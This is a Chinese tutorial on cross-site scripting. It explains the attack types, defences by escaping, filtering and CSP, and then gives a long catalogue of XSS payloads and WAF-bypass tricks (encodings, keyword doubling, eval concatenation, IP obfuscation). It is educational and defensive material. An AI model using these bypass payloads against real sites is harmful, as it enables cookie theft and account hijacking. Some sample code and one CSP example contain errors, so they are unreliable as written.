# XSS 跨站脚本攻击

![xss](img/xss.png)

XSS ( Cross Site Scripting ) 是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到 web 页面中去。使别的用户访问都会执行相应的嵌入代码。

从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。

## XSS 攻击的危害包括：

1. 获取页面数据
2. 获取 cookie
3. 劫持前端逻辑
4. 发送请求
5. 偷取网站任意数据
6. 偷取用户资料
7. 偷取用户密码和登陆态
8. 欺骗用户

## XSS 攻击分类

### 反射型

通过 url 参数直接注入。

发出请求时，XSS 代码出现在 URL 中，作为输入提交到服务器端，服务端解析后返回，XSS 代码随响应内容一起传回给浏览器，最后浏览器执行 XSS 代码。这个过程像一次反射，故叫做反射型 XSS。

**举个例子**

一个链接，里面的 query 字段中包含一个 script 标签，这个标签的 src 就是恶意代码，用户点击了这个链接后会先向服务器发送请求，服务器返回时也携带了这个 XSS 代码，然后浏览器将查询的结果写入 Html，这时恶意代码就被执行了。

并不是在 url 中没有包含 script 标签的网址都是安全的，可以使用[短网址](dwz.com)来让网址变得很短。

### 存储型

存储型 XSS 会被保存到数据库，在其他用户访问（前端）到这条数据时，这个代码会在访问用户的浏览器端执行。

**举个例子**

比如攻击者在一篇文章的评论中写入了 script 标签，这个评论被保存数据库，当其他用户看到这篇文章时就会执行这个脚本。

## XSS 攻击注入点

- HTML 节点内容
  - 如果一个节点内容是动态生成的，而这个内容中包含用户输入。
- HTML 属性
  - 某些节点属性值是由用户输入的内容生成的。那么可能会被封闭标签后添加 script 标签。

```html
<img src="${image}" /> <img src="1" onerror="alert(1)" />
```

- Javascript 代码
  - JS 中包含由后台注入的变量或用户输入的信息。

```js
var data = "#{data}";
var data = "hello";
alert(1);
("");
```

- 富文本

## XSS 防御

对于 XSS 攻击来说，通常有两种方式可以用来防御。

- 转义字符
- CSP 内容安全策略

### 转义字符

- 普通的输入 - 编码

  - 对用户输入数据进行 HTML Entity 编码（使用转义字符）
  - "
  - &
  - <
  - \>
  - 空格

- 富文本 - 过滤（黑名单、白名单）

  - 移除上传的 DOM 属性，如 onerror 等
  - 移除用户上传的 style 节点、script 节点、iframe 节点等

- 较正
  - 避免直接对 HTML Entity 解码
  - 使用 DOM Parse 转换，校正不配对的 DOM 标签和属性

#### 对于会在 DOM 中出现的字符串（用户数据）：

< 转义为 \&lt;

> 转义为 \&gt;

#### 对于可能出现在 DOM 元素属性上的数据

" 转义为 \&quot;
' 转义为 \&9039;
空格转义为 \&nbsp; 但这可能造成多个连续的空格，也可以不对空格转义，但是一定要为属性加双引号

& 这个字符如果要转义，那么一定要放在转移函数的第一个来做

#### 避免 JS 中的插入

```js
var data = "#{data}";
var data = "hello";
alert(1);
("");
```

因为是用引号将变量包裹起来的，而且被攻击也因为引号被提前结束，所以要做的就是将引号转义

```
先 \\ -> \\\\
再 " -> \\"
```

#### 富文本

按照黑名单过滤： script 等
但是 html 标签中能执行 html 代码的属性太多了，比如 onclick, onhover,onerror, <a href="jacascript:alert(1)">

```js
function xssFilter = function (html) {
  html = html.replace(/<\s*\/?script\s*>/g, '');
  html = html.repalce(/javascript:[^'"]/g, '');
  html = html.replace(/onerror\s*=\s*['"]?[^'"]*['"]?/g, '');
  //....
  return html;
}
```

按照白名单过滤： 只允许某些标签和属性存在

做法：将 HTML 解析成树状结构，对于这个 DOM 树，一个一个的去看是否存在合法的标签和属性，如果不是就去掉。

使用 cheerio 就可以快速的解析 DOM

```js
function xssFilter(html) {
  const cheerio = require("cheerio");
  const $ = cheerio.load(html);

  //白名单
  const whiteList = { img: ["src"] };

  $("*").each((index, elem) => {
    if (!whiteList[elem.name]) {
      $(elem).remove();
      return;
    }
    for (let attr in elem.attribs) {
      if (whiteList[elem.name].indexOf(attr) === -1) {
        $(elem).attr(attr, null);
      }
    }
  });
  return html;
}
```

#### 使用 npm 包来简化操作

[xss 文档](https://github.com/leizongmin/js-xss/blob/master/README.zh.md)

### CSP 内容安全策略

CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。

通常可以通过两种方式来开启 CSP：

- 设置 HTTP Header 中的 Content-Security-Policy
- 设置 meta 标签的方式 `<meta http-equiv="Content-Security-Policy">`

以设置 HTTP Header 来举例

- 只允许加载本站资源

```
Content-Security-Policy: default-src ‘self’
```

- 图片只允许加载 HTTPS 协议

```
Content-Security-Policy: img-src https://*
```

- 允许加载任何来源框架

```
Content-Security-Policy: child-src 'none'
```

[CSP](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP) ( Content Security Policy )

## XSS 注入方法

参考链接：https://xz.aliyun.com/t/4067

### `<scirpt>`

    <scirpt>alert("xss");</script>

### `<img>`

    <img src=1 onerror=alert("xss");>

### `<input>`

    <input onfocus="alert('xss');">

    竞争焦点，从而触发onblur事件
    <input onblur=alert("xss") autofocus><input autofocus>

    通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
    <input onfocus="alert('xss');" autofocus>

### `<details>`

    <details ontoggle="alert('xss');">

    使用open属性触发ontoggle事件，无需用户去触发
    <details open ontoggle="alert('xss');">

### `<svg>`

    <svg onload=alert("xss");>

### `<select>`

    <select onfocus=alert(1)></select>

    通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
    <select onfocus=alert(1) autofocus>

### `<iframe>`

    <iframe onload=alert("xss");></iframe>

### `<video>`

    <video><source onerror="alert(1)">

### `<audio>`

    <audio src=x  onerror=alert("xss");>

### `<body>`

    <body/onload=alert("xss");>

利用换行符以及 autofocus，自动去触发 onscroll 事件，无需用户去触发

    <body
    onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>

### `<textarea>`

    <textarea onfocus=alert("xss"); autofocus>

### `<keygen>`

    <keygen autofocus onfocus=alert(1)> //仅限火狐

### `<marquee>`

    <marquee onstart=alert("xss")></marquee> //Chrome不行，火狐和IE都可以

### `<isindex>`

    <isindex type=image src=1 onerror=alert("xss")>//仅限于IE

### 利用 link 远程包含 js 文件

**PS：在无 CSP 的情况下才可以**

    <link rel=import href="http://127.0.0.1/1.js">

### javascript 伪协议

`<a>`标签

    <a href="javascript:alert(`xss`);">xss</a>

`<iframe>`标签

    <iframe src=javascript:alert('xss');></iframe>

`<img>`标签

    <img src=javascript:alert('xss')>//IE7以下

`<form>`标签

    <form action="Javascript:alert(1)"><input type=submit>

### 其它

expression 属性

    <img style="xss:expression(alert('xss''))"> // IE7以下
    <div style="color:rgb(''�x:expression(alert(1))"></div> //IE7以下
    <style>#test{x:expression(alert(/XSS/))}</style> // IE7以下

background 属性

    <table background=javascript:alert(1)></table> //在Opera 10.5和IE6上有效

# 有过滤的情况下

## 过滤空格

用`/`代替空格

<img/src\="x"/onerror\=alert("xss");\>

## 过滤关键字

### 大小写绕过

<ImG sRc\=x onerRor\=alert("xss");\>

### 双写关键字

有些 waf 可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过

<imimgg srsrcc\=x onerror\=alert("xss");\>

### 字符拼接

利用 eval

<img src\="x" onerror\="a=\`aler\`;b=\`t\`;c='(\`xss\`);';eval(a+b+c)"\>

利用 top

    <script>top["al"+"ert"](`xss`);</script>

### 其它字符混淆

有的 waf 可能是用正则表达式去检测是否有 xss 攻击，如果我们能 fuzz 出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了  
下面举几个简单的例子

    可利用注释、标签的优先级等
    1.<<script>alert("xss");//<</script>
    2.<title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
    3.<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>

### 编码绕过

Unicode 编码绕过

<img src\="x" onerror\="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;"\>

<img src\="x" onerror\="eval('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0022\\u0078\\u0073\\u0073\\u0022\\u0029\\u003b')"\>

url 编码绕过

<img src\="x" onerror\="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))"\>

    <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>

Ascii 码绕过

<img src\="x" onerror\="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))"\>

hex 绕过

    <img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>

八进制

    <img src=x onerror=alert('\170\163\163')>

base64 绕过

    <img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">

    <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">

## 过滤双引号，单引号

1.如果是 html 标签中，我们可以不用引号。如果是在 js 中，我们可以用反引号代替单双引号

    <img src="x" onerror=alert(`xss`);>

2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了

## 过滤括号

当括号被过滤的时候可以使用 throw 来绕过

    <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">

## 过滤 url 地址

### 使用 url 编码

    <img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>

### 使用 IP

1.十进制 IP

    <img src="x" onerror=document.location=`http://2130706433/`>

2.八进制 IP

    <img src="x" onerror=document.location=`http://0177.0.0.01/`>

3.hex

    <img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>

4.html 标签中用`//`可以代替`http://`

    <img src="x" onerror=document.location=`//www.baidu.com`>

5.使用`\\`

    但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议

Windows 下  
![](https://xzfile.aliyuncs.com/media/upload/picture/20190208102122-3a40fff4-2b48-1.gif)  
Linux 下  
![](https://xzfile.aliyuncs.com/media/upload/picture/20190208103630-5775e02e-2b4a-1.gif)  
6.使用中文逗号代替英文逗号  
如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号

    <img src="x" onerror="document.location=`http://www。baidu。com`">//会自动跳转到百度
